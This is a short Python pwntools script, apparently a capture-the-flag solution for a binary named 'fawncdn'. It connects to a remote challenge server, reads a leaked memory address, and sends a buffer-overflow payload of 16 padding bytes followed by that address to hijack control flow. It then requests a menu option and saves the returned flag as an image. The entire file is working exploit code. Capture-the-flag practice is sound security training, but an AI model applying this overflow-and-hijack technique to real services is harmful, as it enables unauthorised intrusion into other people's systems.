# -- coding: utf-8 --

from pwn import *

# context.log_level = 'debug'
# p = process("./fawncdn-a3cd1758f2755c61a18f59a10dd6d1ab")
r = remote("35.224.135.84",1001)
elf = ELF("./fawncdn-a3cd1758f2755c61a18f59a10dd6d1ab")



r.sendline(b'1')
r.recvuntil("at ")
line = r.recvuntil('390')

address = p64(int(line,16))
payload = b'A' * 16 + address
print(payload)
r.sendline(payload)
r.recvuntil(b'cmd> ')
r.recvuntil(b'cmd> ')
r.recvuntil(b'cmd> ')
r.sendline('3')

flag = r.recvuntil(b"1. List files.")
print(flag)

with open("flag.jpg","wb") as f:
	f.write(flag)
	exit()

r.interactive()